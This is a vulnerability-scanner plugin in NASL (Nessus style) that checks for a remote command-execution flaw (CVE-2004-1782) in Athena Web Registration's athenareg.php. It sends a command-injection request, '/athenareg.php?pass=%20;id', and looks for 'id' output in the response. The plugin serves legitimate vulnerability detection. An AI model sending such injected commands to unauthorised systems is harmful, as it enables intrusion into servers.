#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Peter Kieser
# This script is released under the GNU GPL v2
#

include("compat.inc");

if(description)
{
 script_id(18376);
 script_version("$Revision: 1.11 $");

 script_bugtraq_id(9349);
 script_cve_id("CVE-2004-1782");
 script_xref(name:"OSVDB", value:"16861");
  
 script_name(english:"Athena Web Registration athenareg.php pass Variable Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Athena Web server. 

The remote version of this software allows for execution of arbitrary
commands through the script 'athenareg.php'.  A malicious user could
exploit this issue to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
 summary["english"] = "Checks for Athena Web Registration remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


http_check_remote_code (
			check_request:"/athenareg.php?pass=%20;id",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
